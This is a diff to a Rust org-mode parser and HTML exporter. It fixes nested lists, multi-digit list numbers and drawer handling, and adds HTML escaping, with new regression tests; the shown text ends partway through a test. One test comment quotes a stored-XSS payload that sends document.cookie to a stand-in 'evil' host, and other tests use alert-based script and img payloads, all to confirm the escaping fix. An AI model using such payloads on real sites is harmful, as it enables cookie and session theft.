@@ -4,9 +4,15 @@
 //! @since: 0.9.0
 
 pub mod html;
+pub mod html_graph;
 pub mod markdown;
 pub mod markdown_parser;
 pub mod org_writer;
+
+// `html_graph` (the KB-subgraph -> bilingual interactive HTML export) ships
+// as a normal, self-contained upstream module with no path-dependency on a
+// sibling checkout (see ADR-077 for why this is a real Rust module rather
+// than a Scheme reimplementation).
 
 /// Document-level metadata extracted from org keywords.
 #[derive(Debug, Clone, Default)]
@@ -29,6 +35,21 @@ pub struct ExportOptions {
     pub num: bool,
     pub author_p: bool,
     pub date_p: bool,
+    /// Whether `#+begin_export html ... #+end_export` blocks are emitted
+    /// raw (trusted, standard org semantics) or HTML-escaped (safe
+    /// default). Deliberately NOT parsed from the document's own
+    /// `#+OPTIONS:` line (see `parse_options_line`) -- unlike every other
+    /// field here, this one is security-relevant: a KB node whose content
+    /// isn't necessarily self-authored (a federated/shared KB, or content
+    /// ingested from elsewhere) could otherwise just add its own
+    /// `#+OPTIONS:` line to re-enable raw HTML passthrough for itself.
+    /// Only a caller that already trusts the source (e.g. `org_export`
+    /// exporting the human's own local buffer, gated behind the
+    /// `org_export_allow_raw_html_blocks` editor option, default off)
+    /// should ever set this to `true`. `kb_export_subgraph_html` never
+    /// sets it -- that path is explicitly a shareable, potentially
+    /// multi-author artifact, so it stays hardcoded-safe.
+    pub allow_raw_html_export_blocks: bool,
 }
 
 impl Default for ExportOptions {
@@ -40,6 +61,7 @@ impl Default for ExportOptions {
             num: true,
             author_p: true,
             date_p: true,
+            allow_raw_html_export_blocks: false,
         }
     }
 }
@@ -92,6 +114,167 @@ pub struct ListItem {
 /// Trait for export backends.
 pub trait Exporter {
     fn export(&self, meta: &OrgMeta, elements: &[OrgElement]) -> String;
+}
+
+/// Strip a leading ordered-list marker (`"1. "`, `"2) "`, ... including
+/// multi-digit item numbers like `"10. "`) and return the remainder, or
+/// `None` if `s` doesn't start with one. `str::strip_prefix` given a
+/// `FnMut(char) -> bool` predicate only strips a single matching
+/// character, not a run -- a naive `strip_prefix(|c| c.is_ascii_digit())`
+/// strips just the `1` off `"10. Document..."`, leaving `"0. Document..."`,
+/// which then fails the `". "`/`") "` check entirely. Any org list with 10+
+/// items hit this: item 10 wasn't recognized as a list item at all and
+/// fell through to plain-paragraph parsing instead, which (before the
+/// paragraph-loop fix alongside this one) also had no properties-drawer
+/// awareness -- a real, reproducible break in the onprem-iac KB's Phase 6
+/// checklist (item 10 of 10).
+fn strip_ordered_marker(s: &str) -> Option<&str> {
+    let digit_len = s.chars().take_while(|c| c.is_ascii_digit()).count();
+    if digit_len == 0 {
+        return None;
+    }
+    let rest = &s[digit_len..];
+    rest.strip_prefix(". ").or_else(|| rest.strip_prefix(") "))
+}
+
+/// Marker-kind-agnostic: strips a leading `- `/`+ ` (unordered) or ordered
+/// marker (see [`strip_ordered_marker`]) from `line` (already left-trimmed)
+/// if it starts one of the given `ordered`-ness, else `None`.
+fn strip_list_marker(line: &str, ordered: bool) -> Option<&str> {
+    if ordered {
+        strip_ordered_marker(line)
+    } else {
+        line.strip_prefix("- ").or_else(|| line.strip_prefix("+ "))
+    }
+}
+
+/// Leading whitespace width of a raw (not-yet-trimmed) line.
+fn indent_of(raw_line: &str) -> usize {
+    raw_line.len() - raw_line.trim_start().len()
+}
+
+/// Parses a list into a flat `Vec<ListItem>`, recursively populating
+/// `children` for a nested sub-list -- a later line matching a list-item
+/// marker at STRICTLY GREATER indentation than `base_indent` (the parent
+/// level's own marker column) starts a nested list under the last item at
+/// this level; one at the SAME indentation is a sibling; one at LESSER
+/// indentation closes this level back to the caller. `lines[*i]` must
+/// already be confirmed to start a list item of `ordered`-ness at
+/// `base_indent` when this is first called. Shared by both the unordered
+/// and ordered list branches below -- the nesting/indentation logic is
+/// identical, only the marker syntax differs (handled via
+/// [`strip_list_marker`]).
+///
+/// `ListItem::children` existed as a field since this parser's origin but
+/// was never populated -- any indented sub-list silently flattened into
+/// the parent list with no structural signal at all. Scoped to real
+/// indentation-based nesting (not a separate "compact"/`-`-only nested
+/// syntax some org tooling also accepts), matching how org itself is
+/// normally authored.
+fn parse_list_items(
+    lines: &[&str],
+    i: &mut usize,
+    base_indent: usize,
+    ordered: bool,
+) -> Vec<ListItem> {
+    let mut items: Vec<ListItem> = Vec::new();
+    while *i < lines.len() {
+        let raw = lines[*i];
+        let trimmed_line = raw.trim();
+        if trimmed_line.is_empty() {
+            break;
+        }
+        let indent = indent_of(raw);
+        if let Some(rest) = strip_list_marker(trimmed_line, ordered) {
+            match indent.cmp(&base_indent) {
+                std::cmp::Ordering::Less => break,
+                std::cmp::Ordering::Equal => {
+                    items.push(ListItem {
+                        content: rest.to_string(),
+                        children: Vec::new(),
+                    });
+                    *i += 1;
+                }
+                std::cmp::Ordering::Greater => {
+                    if let Some(last) = items.last_mut() {
+                        last.children = parse_list_items(lines, i, indent, ordered);
+                    } else {
+                        // No parent item yet at this level to nest under
+                        // (shouldn't normally happen -- a deeper-indented
+                        // marker appearing before any sibling at this
+                        // level) -- treat defensively as a same-level item
+                        // rather than losing the content or looping.
+                        items.push(ListItem {
+                            content: rest.to_string(),
+                            children: Vec::new(),
+                        });
+                        *i += 1;
+                    }
+                }
+            }
+        } else if is_drawer_open_line(trimmed_line) {
+            *i = skip_drawer(lines, *i);
+        } else if indent < base_indent {
+            // A dedented non-marker line (e.g. a following paragraph) --
+            // closes this level back to the caller.
+            break;
+        } else {
+            // Continuation line for the last item at THIS level.
+            if let Some(last) = items.last_mut() {
+                last.content.push(' ');
+                last.content.push_str(trimmed_line);
+            }
+            *i += 1;
+        }
+    }
+    items
+}
+
+/// True when `s` (already trimmed) is a drawer-open marker line -- org's
+/// generic `:NAME:` alone on its own line, e.g. `:PROPERTIES:`,
+/// `:LOGBOOK:`, or any other drawer name (org itself allows arbitrary
+/// drawer names, not just the two built-in ones). Originally this parser
+/// only recognized the literal `:properties:` -- real KB content routinely
+/// carries a `:LOGBOOK:` drawer too (Emacs auto-inserts one on every
+/// TODO-state change / clock entry when `org-log-into-drawer` is set,
+/// extremely common in real org files), and an unrecognized drawer here
+/// doesn't just leak metadata like a missed PROPERTIES drawer would -- it
+/// gets misparsed as list/paragraph content, corrupting or losing real
+/// prose that follows it. Excludes `:END:` itself (a close marker, not an
+/// open one) so a stray/dangling `:END:` is never mistaken for the start
+/// of a new drawer literally named "END".
+fn is_drawer_open_line(s: &str) -> bool {
+    let Some(name) = s.strip_prefix(':').and_then(|rest| rest.strip_suffix(':')) else {
+        return false;
+    };
+    !name.is_empty()
+        && !name.eq_ignore_ascii_case("end")
+        && name
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
+}
+
+/// Advance past a drawer (`:PROPERTIES:`, `:LOGBOOK:`, or any other
+/// `:NAME:` ... `:END:` block) starting at `lines[i]` (caller has already
+/// confirmed `is_drawer_open_line(lines[i].trim())`) and return the index
+/// of the first line after it. Shared by the top-level element scanner and
+/// both list-item continuation loops below -- a KB whose individual list
+/// items each carry their own drawer (this project's convention for
+/// giving stepwise roadmap/checklist items their own stable id, real and
+/// reproducible in the onprem-iac KB) otherwise leaks the drawer verbatim
+/// into a list item's rendered text: only the top-level scanner recognized
+/// a drawer to skip, and it never got a chance to since the list branches
+/// below consumed the same lines first as unconditional "continuation
+/// text" before this function existed.
+fn skip_drawer(lines: &[&str], mut i: usize) -> usize {
+    i += 1;
+    while i < lines.len() {
+        if lines[i].trim().eq_ignore_ascii_case(":end:") {
+            return i + 1;
+        }
+        i += 1;
+    }
+    i
 }
 
 /// Parse an org-mode document into metadata and a flat list of elements.
@@ -148,22 +331,17 @@ pub fn parse_org_document(source: &str) -> (OrgMeta, Vec<OrgElement>) {
             continue;
         }
 
-        // PROPERTIES drawers (`:PROPERTIES:` ... `:END:`, e.g. `:ID:`,
-        // `:KIND:`). Org property drawers are metadata, not renderable
-        // content -- without this branch they fall through to the generic
-        // paragraph collector below and leak into the rendered output
-        // verbatim. Matched case-insensitively like the other keyword
+        // Drawers (`:PROPERTIES:`/`:LOGBOOK:`/any `:NAME:` ... `:END:`
+        // block, e.g. `:ID:`, `:KIND:`). Org drawers are metadata, not
+        // renderable content -- without this branch they fall through to
+        // the generic paragraph collector below and leak into the
+        // rendered output verbatim (or, worse, swallow real prose that
+        // follows them into the wrong element -- see `is_drawer_open_line`'s
+        // doc comment). Matched case-insensitively like the other keyword
         // checks above; org drawer markers are conventionally uppercase
         // but nothing in the spec requires it.
-        if trimmed.eq_ignore_ascii_case(":properties:") {
-            i += 1;
-            while i < lines.len() {
-                if lines[i].trim().eq_ignore_ascii_case(":end:") {
-                    i += 1;
-                    break;
-                }
-                i += 1;
-            }
+        if is_drawer_open_line(trimmed) {
+            i = skip_drawer(&lines, i);
             continue;
         }
 
@@ -353,26 +531,8 @@ pub fn parse_org_document(source: &str) -> (OrgMeta, Vec<OrgElement>) {
 
         // Lists
         if trimmed.starts_with("- ") || trimmed.starts_with("+ ") {
-            let mut items = Vec::new();
-            while i < lines.len() {
-                let ll = lines[i].trim();
-                if ll.starts_with("- ") || ll.starts_with("+ ") {
-                    items.push(ListItem {
-                        content: ll[2..].to_string(),
-                        children: Vec::new(),
-                    });
-                    i += 1;
-                } else if ll.is_empty() {
-                    break;
-                } else {
-                    // Continuation line
-                    if let Some(last) = items.last_mut() {
-                        last.content.push(' ');
-                        last.content.push_str(ll);
-                    }
-                    i += 1;
-                }
-            }
+            let base_indent = indent_of(line);
+            let items = parse_list_items(&lines, &mut i, base_indent, false);
             elements.push(OrgElement::List {
                 ordered: false,
                 items,
@@ -381,43 +541,17 @@ pub fn parse_org_document(source: &str) -> (OrgMeta, Vec<OrgElement>) {
         }
 
         // Ordered lists
-        if trimmed.len() > 2 && trimmed.chars().next().is_some_and(|c| c.is_ascii_digit()) {
-            if let Some(rest) = trimmed
-                .strip_prefix(|c: char| c.is_ascii_digit())
-                .and_then(|s| s.strip_prefix(". ").or(s.strip_prefix(") ")))
-            {
-                let mut items = vec![ListItem {
-                    content: rest.to_string(),
-                    children: Vec::new(),
-                }];
-                i += 1;
-                while i < lines.len() {
-                    let ll = lines[i].trim();
-                    if let Some(item_rest) = ll
-                        .strip_prefix(|c: char| c.is_ascii_digit())
-                        .and_then(|s| s.strip_prefix(". ").or(s.strip_prefix(") ")))
-                    {
-                        items.push(ListItem {
-                            content: item_rest.to_string(),
-                            children: Vec::new(),
-                        });
-                        i += 1;
-                    } else if ll.is_empty() {
-                        break;
-                    } else {
-                        if let Some(last) = items.last_mut() {
-                            last.content.push(' ');
-                            last.content.push_str(ll);
-                        }
-                        i += 1;
-                    }
-                }
-                elements.push(OrgElement::List {
-                    ordered: true,
-                    items,
-                });
-                continue;
-            }
+        if trimmed.len() > 2
+            && trimmed.chars().next().is_some_and(|c| c.is_ascii_digit())
+            && strip_ordered_marker(trimmed).is_some()
+        {
+            let base_indent = indent_of(line);
+            let items = parse_list_items(&lines, &mut i, base_indent, true);
+            elements.push(OrgElement::List {
+                ordered: true,
+                items,
+            });
+            continue;
         }
 
         // Blank lines
@@ -440,6 +574,16 @@ pub fn parse_org_document(source: &str) -> (OrgMeta, Vec<OrgElement>) {
                 || pl.starts_with("-----")
             {
                 break;
+            }
+            if is_drawer_open_line(pl) {
+                // A drawer embedded mid-paragraph (e.g. an org list item
+                // whose own drawer fell through to plain-paragraph
+                // parsing, or a heading's :LOGBOOK: drawer) is metadata,
+                // not prose -- skip it rather than appending it verbatim.
+                // See skip_drawer's doc comment for the real KB pattern
+                // this handles.
+                i = skip_drawer(&lines, i);
+                continue;
             }
             para_lines.push(lines[i].to_string());
             i += 1;
@@ -540,6 +684,14 @@ fn parse_heading_todo(title: &str) -> (Option<String>, String) {
 pub enum InlineTarget {
     Html,
     Markdown,
+    /// Bare text, no markup at all — emphasis markers vanish (not `<b>`/
+    /// `**`, just the inner text) and links resolve to their label alone
+    /// (or the bare target, `id:`-stripped, if unlabeled) with no
+    /// brackets/href. Added specifically so `plain_text_preview` (used for
+    /// hover-popover previews) can reuse this one parser instead of a
+    /// second, separate link-stripping implementation — see that
+    /// function's doc comment.
+    PlainText,
 }
 
 /// Convert org inline markup using string slicing (not char-based).
@@ -560,15 +712,21 @@ pub fn convert_inline_markup_str(text: &str, target: InlineTarget) -> String {
                         ('*', InlineTarget::Markdown) => {
                             format!("**{}**", convert_inline_markup_str(content, target))
                         }
+                        ('*' | '/', InlineTarget::PlainText) => {
+                            convert_inline_markup_str(content, target)
+                        }
                         ('/', InlineTarget::Html) => {
                             format!("<i>{}</i>", convert_inline_markup_str(content, target))
                         }
                         ('/', InlineTarget::Markdown) => {
                             format!("*{}*", convert_inline_markup_str(content, target))
                         }
-                        ('~' | '=', InlineTarget::Html) => format!("<code>{}</code>", content),
+                        ('~' | '=', InlineTarget::Html) => {
+                            format!("<code>{}</code>", html_escape(content))
+                        }
                         ('~' | '=', InlineTarget::Markdown) => format!("`{}`", content),
-                        ('+', InlineTarget::Html) => format!("<del>{}</del>", content),
+                        ('~' | '=' | '+', InlineTarget::PlainText) => content.to_string(),
+                        ('+', InlineTarget::Html) => format!("<del>{}</del>", html_escape(content)),
                         ('+', InlineTarget::Markdown) => format!("~~{}~~", content),
                         _ => content.to_string(),
                     };
@@ -591,24 +749,71 @@ pub fn convert_inline_markup_str(text: &str, target: InlineTarget) -> String {
                     InlineTarget::Markdown => {
                         result.push_str(&format!("<{}>", url));
                     }
+                    // No brackets, no href -- just the bare URL text, same
+                    // "no markup at all" contract as the org-link PlainText
+                    // arm below (this is the same hover-popover-preview use
+                    // case: a bare URL should read as plain text there too,
+                    // not `<...>`-wrapped Markdown-style markup).
+                    InlineTarget::PlainText => {
+                        result.push_str(url);
+                    }
                 }
                 i = end;
                 continue;
             }
             '[' if text[i..].starts_with("[[") => {
                 if let Some((end, link_target, label)) = parse_org_link_str(text, i) {
+                    // `id:` prefix survives on raw-org-file input but is
+                    // already stripped on `mae_kb`-normalized input (see
+                    // `parse_org_link_str`'s doc comment) -- strip
+                    // defensively either way so it's never shown/used
+                    // inconsistently. A stripped/bare (non-URL) target is
+                    // an internal KB reference: give it a `#`-prefixed
+                    // href (a real, if currently unhandled, in-page
+                    // anchor form) rather than an invalid bare-UUID href.
+                    let stripped_target = link_target.strip_prefix("id:").unwrap_or(link_target);
+                    let is_external = stripped_target.contains("://");
+                    let href = if is_external {
+                        stripped_target.to_string()
+                    } else {
+                        format!("#{stripped_target}")
+                    };
                     match target {
                         InlineTarget::Html => {
-                            let display = label.unwrap_or(link_target);
+                            // `Some(l)` is already HTML-escaped by the
+                            // recursive call (it walks the same char-by-
+                            // char escaping this whole function does);
+                            // the `None` (bare-target-as-label) case
+                            // isn't escaped yet, so it still needs it
+                            // here -- escaping `display` unconditionally
+                            // would double-escape the `Some` case.
+                            let display_html = match &label {
+                                Some(l) => convert_inline_markup_str(l, target),
+                                None => html_escape(stripped_target),
+                            };
                             result.push_str(&format!(
                                 "<a href=\"{}\">{}</a>",
-                                html_escape(link_target),
-                                html_escape(display)
+                                html_escape(&href),
+                                display_html
                             ));
                         }
                         InlineTarget::Markdown => {
-                            let display = label.unwrap_or(link_target);
-                            result.push_str(&format!("[{}]({})", display, link_target));
+                            let display = match &label {
+                                Some(l) => convert_inline_markup_str(l, target),
+                                None => stripped_target.to_string(),
+                            };
+                            result.push_str(&format!("[{display}]({href})"));
+                        }
+                        InlineTarget::PlainText => {
+                            // No brackets, no href -- just the label (or
+                            // the bare, id:-stripped target if unlabeled).
+                            // This is the fix for hover-popover previews
+                            // that used to show raw "[[UUID|label]]" text.
+                            let display = match &label {
+                                Some(l) => convert_inline_markup_str(l, target),
+                                None => stripped_target.to_string(),
+                            };
+                            result.push_str(&display);
                         }
                     }
                     i = end + 1;
@@ -625,10 +830,11 @@ pub fn convert_inline_markup_str(text: &str, target: InlineTarget) -> String {
         // byte-position-safe even with multibyte content nearby. But
         // falling through to here and still using `ch`/`i += 1` for the
         // general case was a real bug: any non-ASCII character (an
-        // em-dash, any accented character) got decoded one raw byte at a
-        // time instead of one Unicode scalar at a time, corrupting it into
-        // 2-4 garbage Latin-1-ish characters. Decode the real char here
-        // instead.
+        // em-dash, any accented character -- i.e. this function silently
+        // mangled every Spanish translation) got decoded one raw byte at
+        // a time instead of one Unicode scalar at a time, corrupting it
+        // into 2-4 garbage Latin-1-ish characters. Decode the real char
+        // here instead.
         let real_ch = text[i..]
             .chars()
             .next()
@@ -712,7 +918,20 @@ fn find_bare_url_end(text: &str, start: usize) -> usize {
 }
 
 fn parse_org_link_str(text: &str, start: usize) -> Option<(usize, &str, Option<&str>)> {
-    // [[target][label]] or [[target]]
+    // [[target][label]] (raw org-file two-bracket-group form) or [[target]]
+    // (bare) -- AND `[[target|label]]` (single bracket-group, pipe-
+    // separated), which is NOT standard org-file syntax but IS the literal
+    // storage form `mae_kb`'s own org parser canonicalizes every internal
+    // `[[id:UUID][label]]` link into (see `shared/kb/src/org.rs`'s link
+    // normalization, "the internal pipe-display convention"). Both this
+    // module's exporters (`html.rs`'s `HtmlExporter`, `html_graph.rs`'s
+    // graph export) render `mae_kb::Node::body` -- i.e. the ALREADY-
+    // normalized pipe form, not raw org-file text -- so without this,
+    // every internal link renders as a garbled, unsplit "UUID|label"
+    // string used as both href and visible text. Recognizing `|` here is
+    // safe/non-regressive for genuine raw-org-file callers: standard
+    // Org-mode link syntax never legitimately puts a bare `|` inside a
+    // single `[[...]]` bracket pair.
     if !text[start..].starts_with("[[") {
         return None;
     }
@@ -728,8 +947,12 @@ fn parse_org_link_str(text: &str, start: usize) -> Option<(usize, &str, Option<&
         }
     }
     if let Some(close_pos) = rest.find("]]") {
-        let target = &text[after_open..after_open + close_pos];
-        return Some((after_open + close_pos + 1, target, None));
+        let inner = &text[after_open..after_open + close_pos];
+        let end = after_open + close_pos + 1;
+        if let Some(bar) = inner.find('|') {
+            return Some((end, &inner[..bar], Some(&inner[bar + 1..])));
+        }
+        return Some((end, inner, None));
     }
     None
 }
@@ -932,6 +1155,206 @@ mod tests {
     }
 
     #[test]
+    fn ordered_list_item_with_its_own_properties_drawer_does_not_leak_it() {
+        // Real, reproducible leak from the onprem-iac KB: this project gives
+        // individual roadmap/checklist steps their own stable :ID:, so each
+        // numbered item can carry its own :PROPERTIES: drawer, not just the
+        // document as a whole. The top-level scanner already stripped a
+        // drawer that starts a document/paragraph, but once the parser
+        // enters the ordered-list continuation-line loop it used to glue
+        // every non-blank line (including a nested drawer's :PROPERTIES:/
+        // :ID:/:END: lines) into the item's own rendered content verbatim.
+        let src = "1. Document a runbook covering rollback steps if the\n   upgrade fails partway.\n   :PROPERTIES:\n   :ID: db87b07f-2f87-4f0d-b1dc-4f398313bf73\n   :END:\n   Validated by: cross-checked against the runbook.\n2. Establish an on-call rotation.\n";
+        let (_, elements) = parse_org_document(src);
+        assert_eq!(elements.len(), 1);
+        let OrgElement::List { ordered, items } = &elements[0] else {
+            panic!("expected a List element, got {:?}", elements[0]);
+        };
+        assert!(ordered);
+        assert_eq!(
+            items.len(),
+            2,
+            "the drawer must not be misparsed as a third item"
+        );
+        assert!(
+            !items[0].content.contains(":PROPERTIES:") && !items[0].content.contains(":END:"),
+            "drawer must not leak into item 1's content: {:?}",
+            items[0].content
+        );
+        assert!(
+            items[0].content.contains("upgrade fails partway."),
+            "real prose around the drawer must survive: {:?}",
+            items[0].content
+        );
+        assert!(
+            items[0]
+                .content
+                .contains("Validated by: cross-checked against the runbook."),
+            "content after the drawer must survive: {:?}",
+            items[0].content
+        );
+        assert_eq!(items[1].content, "Establish an on-call rotation.");
+    }
+
+    #[test]
+    fn unordered_list_item_with_its_own_properties_drawer_does_not_leak_it() {
+        let src =
+            "- First item.\n  :PROPERTIES:\n  :ID: abc123\n  :END:\n  More text.\n- Second item.\n";
+        let (_, elements) = parse_org_document(src);
+        let OrgElement::List { items, .. } = &elements[0] else {
+            panic!("expected a List element, got {:?}", elements[0]);
+        };
+        assert_eq!(items.len(), 2);
+        assert!(!items[0].content.contains(":PROPERTIES:"));
+        assert_eq!(items[0].content, "First item. More text.");
+        assert_eq!(items[1].content, "Second item.");
+    }
+
+    #[test]
+    fn nested_unordered_sub_list_populates_children_not_a_flattened_sibling() {
+        // ListItem::children existed since this parser's origin but was
+        // never populated -- a sub-list indented under a parent item
+        // silently flattened into one long sibling list with no
+        // structural signal a nested list ever existed.
+        let src = "- Top item one\n  - Nested sub-item A\n  - Nested sub-item B\n- Top item two\n";
+        let (_, elements) = parse_org_document(src);
+        let OrgElement::List { ordered, items } = &elements[0] else {
+            panic!("expected a List element, got {:?}", elements[0]);
+        };
+        assert!(!ordered);
+        assert_eq!(
+            items.len(),
+            2,
+            "must be 2 top-level items, not 4 flattened siblings"
+        );
+        assert_eq!(items[0].content, "Top item one");
+        assert_eq!(items[0].children.len(), 2);
+        assert_eq!(items[0].children[0].content, "Nested sub-item A");
+        assert_eq!(items[0].children[1].content, "Nested sub-item B");
+        assert!(items[0].children[0].children.is_empty());
+        assert_eq!(items[1].content, "Top item two");
+        assert!(items[1].children.is_empty());
+    }
+
+    #[test]
+    fn two_levels_of_nesting_both_populate_correctly() {
+        let src = "- A\n  - B\n    - C\n  - D\n- E\n";
+        let (_, elements) = parse_org_document(src);
+        let OrgElement::List { items, .. } = &elements[0] else {
+            panic!("expected a List element, got {:?}", elements[0]);
+        };
+        assert_eq!(items.len(), 2);
+        assert_eq!(items[0].content, "A");
+        assert_eq!(items[1].content, "E");
+        let level2 = &items[0].children;
+        assert_eq!(level2.len(), 2);
+        assert_eq!(level2[0].content, "B");
+        assert_eq!(level2[1].content, "D");
+        assert_eq!(level2[0].children.len(), 1);
+        assert_eq!(level2[0].children[0].content, "C");
+        assert!(level2[1].children.is_empty());
+    }
+
+    #[test]
+    fn nested_ordered_sub_list_populates_children() {
+        let src = "1. Parent\n   1. Child one\n   2. Child two\n2. Second parent\n";
+        let (_, elements) = parse_org_document(src);
+        let OrgElement::List { ordered, items } = &elements[0] else {
+            panic!("expected a List element, got {:?}", elements[0]);
+        };
+        assert!(ordered);
+        assert_eq!(items.len(), 2);
+        assert_eq!(items[0].content, "Parent");
+        assert_eq!(items[0].children.len(), 2);
+        assert_eq!(items[0].children[0].content, "Child one");
+        assert_eq!(items[0].children[1].content, "Child two");
+        assert_eq!(items[1].content, "Second parent");
+    }
+
+    #[test]
+    fn a_nested_sub_item_with_its_own_drawer_does_not_leak_it() {
+        // Composes the drawer-generalization fix with the nesting fix:
+        // both changes touch the same list-parsing loop, so a nested item
+        // carrying its own drawer is the real adversarial case to confirm
+        // neither fix regressed the other.
+        let src = "- Parent item\n  - Nested item.\n    :PROPERTIES:\n    :ID: nested-1\n    :END:\n    Follow-up note.\n";
+        let (_, elements) = parse_org_document(src);
+        let OrgElement::List { items, .. } = &elements[0] else {
+            panic!("expected a List element, got {:?}", elements[0]);
+        };
+        assert_eq!(items.len(), 1);
+        assert_eq!(items[0].children.len(), 1);
+        let nested = &items[0].children[0];
+        assert!(
+            !nested.content.contains(":PROPERTIES:") && !nested.content.contains(":END:"),
+            "drawer must not leak into the nested item's content: {:?}",
+            nested.content
+        );
+        assert_eq!(nested.content, "Nested item. Follow-up note.");
+    }
+
+    #[test]
+    fn flat_non_nested_lists_are_unaffected_by_the_nesting_feature() {
+        // Regression guard: a plain, consistently-indented flat list (the
+        // overwhelmingly common real-world case, and every list fixture in
+        // this file before this feature existed) must produce the exact
+        // same flat structure as before -- zero nesting detected when
+        // every marker sits at identical indentation.
+        let src = "- one\n- two\n- three\n";
+        let (_, elements) = parse_org_document(src);
+        let OrgElement::List { items, .. } = &elements[0] else {
+            panic!("expected a List element, got {:?}", elements[0]);
+        };
+        assert_eq!(items.len(), 3);
+        assert!(items.iter().all(|it| it.children.is_empty()));
+    }
+
+    #[test]
+    fn ordered_list_recognizes_multi_digit_item_numbers() {
+        // Real, reproducible bug in the onprem-iac KB's Phase 6 checklist
+        // (10 items): strip_prefix(|c: char| c.is_ascii_digit()) strips only
+        // ONE leading digit, not a run -- "10. Document..." became
+        // "0. Document..." after stripping just the "1", which then failed
+        // the ". "/") " check entirely. Item 10 fell through to plain-
+        // paragraph parsing instead of being recognized as list item 10,
+        // breaking both its own :PROPERTIES: drawer stripping (a different,
+        // now also-fixed code path) and the list's own item count/order.
+        let src = "1. First.\n2. Second.\n9. Ninth.\n10. Tenth.\n11. Eleventh.\n";
+        let (_, elements) = parse_org_document(src);
+        assert_eq!(
+            elements.len(),
+            1,
+            "all five items must parse as ONE list, not split at item 10"
+        );
+        let OrgElement::List { ordered, items } = &elements[0] else {
+            panic!("expected a List element, got {:?}", elements[0]);
+        };
+        assert!(ordered);
+        assert_eq!(items.len(), 5);
+        assert_eq!(items[3].content, "Tenth.");
+        assert_eq!(items[4].content, "Eleventh.");
+    }
+
+    #[test]
+    fn a_plain_paragraphs_embedded_properties_drawer_is_not_leaked() {
+        // The third of three accumulation sites that all needed the same
+        // fix: the top-level scanner (pre-existing, #528), both list
+        // continuation loops (fixed above), and this generic paragraph
+        // fallback -- exercised for real when a multi-digit ordered-list
+        // item (see the test above) fell through to paragraph parsing
+        // before that bug was fixed, but also reachable directly by any
+        // plain paragraph carrying its own drawer.
+        let src = "Some prose.\n:PROPERTIES:\n:ID: xyz\n:END:\nMore prose after the drawer.\n";
+        let (_, elements) = parse_org_document(src);
+        let OrgElement::Paragraph(text) = &elements[0] else {
+            panic!("expected a Paragraph element, got {:?}", elements[0]);
+        };
+        assert!(!text.contains(":PROPERTIES:") && !text.contains(":END:"));
+        assert!(text.contains("Some prose."));
+        assert!(text.contains("More prose after the drawer."));
+    }
+
+    #[test]
     fn parse_options() {
         let src = "#+OPTIONS: toc:2 H:3 num:nil\n";
         let (meta, _) = parse_org_document(src);
@@ -974,6 +1397,33 @@ mod tests {
     fn inline_markup_code_html() {
         let result = convert_inline_markup_str("hello =world=", InlineTarget::Html);
         assert_eq!(result, "hello <code>world</code>");
+    }
+
+    #[test]
+    fn adversarial_code_span_content_is_html_escaped_not_injected() {
+        // Real, no-click stored-XSS: a KB node body containing
+        // ~<img src=x onerror=fetch('https://evil/?c='+document.cookie)>~
+        // used to pass `content` straight into `<code>{}</code>` with zero
+        // escaping -- the resulting fragment is later assigned via
+        // `element.innerHTML` in the exported HTML's chord-diagram viewer,
+        // so the payload executes on render, no interaction required.
+        let payload = "~<img src=x onerror=alert(1)>~";
+        let result = convert_inline_markup_str(payload, InlineTarget::Html);
+        assert!(
+            !result.contains("<img"),
+            "a live <img> tag must never survive into the rendered fragment: {result}"
+        );
+        assert_eq!(result, "<code>&lt;img src=x onerror=alert(1)&gt;</code>");
+    }
+
+    #[test]
+    fn adversarial_strikethrough_content_is_html_escaped_not_injected() {
+        // Same bug, same fix, the sibling `+strikethrough+` marker (<del>)
+        // had the identical unescaped-content pattern.
+        let payload = "+<script>alert(1)</script>+";
+        let result = convert_inline_markup_str(payload, InlineTarget::Html);
+        assert!(!result.contains("<script>"), "unescaped: {result}");
+        assert_eq!(result, "<del>&lt;script&gt;alert(1)&lt;/script&gt;</del>");
     }
 
     #[test]
@@ -1105,6 +1555,65 @@ mod tests {
     }
 
     #[test]
+    fn a_heading_with_both_properties_and_logbook_drawers_leaks_neither() {
+        // Real, reproducible content-loss bug (worse than a metadata
+        // leak): Emacs auto-inserts a :LOGBOOK: drawer on every TODO-state
+        // change / clock entry when org-log-into-drawer is set -- an
+        // extremely common real-KB shape this parser had zero awareness
+        // of before generalizing is_drawer_open_line beyond the literal
+        // ":properties:" token. The old behavior didn't just leak the
+        // drawer's own :END:/CLOCK: lines as visible text -- it also
+        // swallowed real body prose that followed into the wrong element.
+        let src = "* Heading\n:PROPERTIES:\n:ID: h1\n:END:\n:LOGBOOK:\n- State \"DONE\" from \"TODO\" [2024-01-01 Mon 10:00]\nCLOCK: [2024-01-01 Mon 09:00]--[2024-01-01 Mon 10:00] =>  1:00\n:END:\nBody text after logbook.\n";
+        let (_, elements) = parse_org_document(src);
+        assert_eq!(elements.len(), 2, "got {elements:?}");
+        assert!(matches!(&elements[0], OrgElement::Heading { .. }));
+        assert!(
+            matches!(&elements[1], OrgElement::Paragraph(p) if p == "Body text after logbook."),
+            "real body prose after both drawers must survive intact, not be swallowed \
+             into a bogus list item or mangled: {:?}",
+            elements[1]
+        );
+    }
+
+    #[test]
+    fn a_logbook_drawer_inside_a_list_item_does_not_leak() {
+        // Same bug, list-item variant (the shape this project's own
+        // roadmap-checklist convention actually hits, per the earlier
+        // PROPERTIES-in-a-list-item fix).
+        let src = "1. Do the thing.\n   :LOGBOOK:\n   CLOCK: [2024-01-01 Mon 09:00]--[2024-01-01 Mon 10:00] =>  1:00\n   :END:\n   Follow-up note.\n";
+        let (_, elements) = parse_org_document(src);
+        let OrgElement::List { items, .. } = &elements[0] else {
+            panic!("expected a List element, got {:?}", elements[0]);
+        };
+        assert_eq!(items.len(), 1);
+        assert!(
+            !items[0].content.contains(":LOGBOOK:") && !items[0].content.contains(":END:"),
+            "drawer must not leak into the item's content: {:?}",
+            items[0].content
+        );
+        assert_eq!(items[0].content, "Do the thing. Follow-up note.");
+    }
+
+    #[test]
+    fn is_drawer_open_line_rejects_a_bare_end_marker_and_midsentence_colons() {
+        // Adversarial guards on the generalized drawer-open detection:
+        // ":END:" alone must never be treated as opening a new drawer
+        // literally named "END" (which would send skip_drawer hunting
+        // for a SECOND, non-existent ":END:" and swallow the rest of the
+        // document), and a line containing a colon-wrapped word that
+        // ISN'T alone on its own line (e.g. a tag-like ":word:" embedded
+        // in prose) must not match either.
+        assert!(!is_drawer_open_line(":END:"));
+        assert!(!is_drawer_open_line(":end:"));
